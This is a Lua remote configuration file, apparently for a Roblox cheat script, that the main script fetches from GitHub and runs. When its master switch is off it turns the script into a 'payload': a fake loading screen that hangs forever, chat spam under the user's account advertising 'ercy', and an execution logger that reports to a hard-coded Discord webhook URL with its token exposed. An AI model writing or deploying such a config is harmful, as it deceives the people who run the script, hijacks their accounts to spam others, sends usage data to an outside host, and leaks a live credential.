--[[
    GATE CONFIG — hosted on GitHub
    ───────────────────────────────
    Edit this file to remotely control the script.
    The main script fetches and executes this file.
    
    After editing, push to GitHub and the changes
    take effect for everyone on next execution.
]]

return {
    -- ═══════════════════════════════════════════════════════════════
    --  MASTER SWITCH
    -- ═══════════════════════════════════════════════════════════════
    enabled = false,  -- set to false to disable the script & run payload

    -- ═══════════════════════════════════════════════════════════════
    --  AD MESSAGES (used when enabled = false / payload mode)
    -- ═══════════════════════════════════════════════════════════════
    ad_message = "/ercy on top, join for free scripts",

    ad_chat_messages = {
        "/ercy on top ",
        "join ercy NOW",
        "ercy owns you ",
        "/ercy was here",
        "you got caught lacking by ercy",
    },

    -- ═══════════════════════════════════════════════════════════════
    --  WEBHOOK (execution logger)
    -- ═══════════════════════════════════════════════════════════════
    webhook_url = "https://discord.com/api/webhooks/1429929671872745634/fb3aATaorkzWPohk9rzdlTN7TsWBdK7SOcD81T2RxNUwqX4M3Ag8W0BT4loT3Z7u8mFF",
    webhook_enabled = true,  -- set to false to stop logging

    -- ═══════════════════════════════════════════════════════════════
    --  GROUP IDS TO CHECK
    -- ═══════════════════════════════════════════════════════════════
    group_ids = { 260140977, 633417839 },

    -- ═══════════════════════════════════════════════════════════════
    --  LOADING SCREEN MESSAGES (fake loading before payload)
    -- ═══════════════════════════════════════════════════════════════
    loading_steps = {
        { text = "Initializing script...",            duration = 1.5 },
        { text = "Connecting to server...",           duration = 2.0 },
        { text = "Checking key system...",            duration = 2.5 },
        { text = "Key verified",                      duration = 1.0 },
        { text = "Looking for mods...",               duration = 2.0 },
        { text = "No mods detected",                  duration = 1.0 },
        { text = "Checking gate URL...",              duration = 2.5 },
        { text = "Gate responded",                    duration = 1.0 },
        { text = "Loading modules...",                duration = 1.5 },
        { text = "Fetching remote config...",         duration = 2.0 },
        { text = "Injecting hooks...",                duration = 1.5 },
        { text = "Almost ready...",                   duration = 1.0 },
        { text = "Script disabled by o3fu, please wait as we re-enable it.", duration = 999999999 },
    },

    -- ═══════════════════════════════════════════════════════════════
    --  CHAT SPAM SETTINGS
    -- ═══════════════════════════════════════════════════════════════
    chat_spam_interval = 6,  -- seconds between each chat message
}
